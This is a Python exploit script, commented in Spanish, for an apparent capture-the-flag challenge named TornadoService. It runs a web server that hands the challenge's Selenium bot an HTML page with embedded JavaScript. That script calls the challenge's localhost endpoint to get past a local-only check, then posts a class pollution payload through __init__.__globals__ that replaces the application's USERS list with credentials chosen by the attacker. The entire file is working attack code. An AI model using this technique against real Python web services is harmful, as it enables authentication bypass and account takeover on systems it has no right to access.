#!/usr/bin/env python3
"""
server.py - Sirve el payload de class pollution al bot de Selenium del reto TornadoService.

El bot visita  http://<TU_IP>:<PUERTO>/agent_details
Cuando carga esa pagina, el JS embebido hace un fetch a localhost:1337/update_tornado
(desde DENTRO del contenedor del reto -> pasa is_request_from_localhost) y sobreescribe
la lista USERS del modulo via __init__.__globals__.

Uso:
    python3 server.py --target http://CHALLENGE_HOST:PORT --listen-port 8383 \
                      --machine-id host-1234 --user pwn@x.htb --pass pwn

Si no pasas --machine-id, el HTML lo descubre solo: primero hace GET /get_tornados,
toma el primer machine_id real y con ese arma el payload (mas robusto, porque la lista
de tornados es aleatoria en cada arranque del contenedor).
"""
import argparse
import json
from http.server import HTTPServer, BaseHTTPRequestHandler


def build_payload_html(target, machine_id, username, password):
    """
    HTML que el bot ejecutara. Hace dos cosas:
      1. Si no se fijo machine_id, lo descubre via /get_tornados.
      2. POST /update_tornado con el payload de class pollution que reemplaza USERS.
    Todas las peticiones van a `target` (el propio reto), que para el bot es localhost.
    """
    # machine_id puede ser None -> el JS lo resuelve solo
    mid_js = json.dumps(machine_id)  # null o "host-XXXX"
    return f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>agent_details</title></head>
<body>
<h1>agent details</h1>
<script>
(async () => {{
  const TARGET = {json.dumps(target)};
  let machineId = {mid_js};

  // 1) Descubrir un machine_id real si no nos lo dieron.
  if (!machineId) {{
    try {{
      const r = await fetch(TARGET + "/get_tornados");
      const list = await r.json();
      if (Array.isArray(list) && list.length && list[0].machine_id) {{
        machineId = list[0].machine_id;
      }}
    }} catch (e) {{ /* si falla seguimos con lo que haya */ }}
  }}

  // 2) Payload de class pollution: navega instance.__init__.__globals__
  //    y sobreescribe USERS entero con credenciales que controlamos.
  const payload = {{
    machine_id: machineId,
    __init__: {{
      __globals__: {{
        USERS: [ {{ username: {json.dumps(username)}, password: {json.dumps(password)} }} ]
      }}
    }}
  }};

  try {{
    await fetch(TARGET + "/update_tornado", {{
      method: "POST",
      headers: {{ "Content-Type": "text/plain" }},
      body: JSON.stringify(payload)
    }});
  }} catch (e) {{ /* el bot es localhost; deberia pasar */ }}
}})();
</script>
</body>
</html>"""


class PayloadHandler(BaseHTTPRequestHandler):
    # Inyectadas desde main() antes de arrancar
    HTML = b""

    def _send_html(self):
        self.send_response(200)
        # El bot pide /agent_details sin extension -> forzamos text/html
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(self.HTML)))
        # Permitir que el JS hable con el reto sin lios de CORS de cara al bot
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(self.HTML)

    def do_GET(self):
        # Servimos el mismo HTML para cualquier ruta (incluido /agent_details)
        self._send_html()

    def log_message(self, fmt, *args):
        # Log compacto para ver cuando el bot pasa
        print(f"[server] {self.address_string()} {fmt % args}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True,
                    help="URL del reto tal como lo ve el BOT, normalmente http://localhost:1337")
    ap.add_argument("--listen-port", type=int, default=8383)
    ap.add_argument("--machine-id", default=None,
                    help="machine_id existente; si se omite, el HTML lo descubre solo")
    ap.add_argument("--user", default="pwn@x.htb")
    ap.add_argument("--pass", dest="password", default="pwn")
    args = ap.parse_args()

    html = build_payload_html(args.target, args.machine_id, args.user, args.password)
    PayloadHandler.HTML = html.encode("utf-8")

    srv = HTTPServer(("0.0.0.0", args.listen_port), PayloadHandler)
    print(f"[server] escuchando en 0.0.0.0:{args.listen_port}")
    print(f"[server] el bot debe visitar  http://<TU_IP>:{args.listen_port}/agent_details")
    print(f"[server] payload reemplazara USERS con {args.user} / {args.password}")
    print(f"[server] target (visto por el bot): {args.target}")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[server] detenido")


if __name__ == "__main__":
    main()